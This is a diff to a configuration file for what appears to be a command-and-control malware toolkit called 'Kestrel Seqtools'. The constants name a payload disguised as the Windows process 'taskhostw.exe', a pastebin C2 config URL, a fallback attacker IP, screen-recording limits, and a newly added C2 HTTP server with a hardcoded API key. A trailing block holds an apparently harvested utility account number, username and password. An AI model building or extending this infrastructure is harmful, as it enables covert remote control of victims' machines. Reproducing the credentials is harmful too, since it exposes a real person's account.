@@ -2,6 +2,10 @@
 Configuration constants for Kestrel Seqtools
 """
 
+# ============================================================================
+# TCP SERVER CONFIGURATION
+# ============================================================================
+
 # Network Configuration
 DEFAULT_HOST = "0.0.0.0"
 DEFAULT_PORT = 5555
@@ -16,9 +20,21 @@ BINARY_START_MARKER = b"<BINARY>"
 PAYLOAD_NAME = "taskhostw.exe"
 TASK_NAME = "taskhostw"
 
-# C2 Configuration
+# C2 Configuration (Legacy)
 CONFIG_URL = "https://pastebin.com/raw/YgNuztHj"
 FALLBACK_HOST = "52.21.29.104"
+
+# ============================================================================
+# FASTAPI HTTP SERVER CONFIGURATION
+# ============================================================================
+
+# API Key for authentication (hardcoded for simplicity)
+# This key must be included in X-API-Key header for all HTTP requests
+C2_API_KEY = "kestrel_c2_2024_secure_key_f8a9b2c1d4e5"
+
+# FastAPI server configuration
+FASTAPI_HOST = "0.0.0.0"
+FASTAPI_PORT = 8080
 
 # Feature Limits
 MAX_SCREENRECORD_DURATION = 900  # 15 minutes in seconds (not enforced currently)
@@ -87,4 +103,3 @@ DTE Energy online
 acct 2847-3821-9918
 bobgardner / DTEaccess2021
 """
-
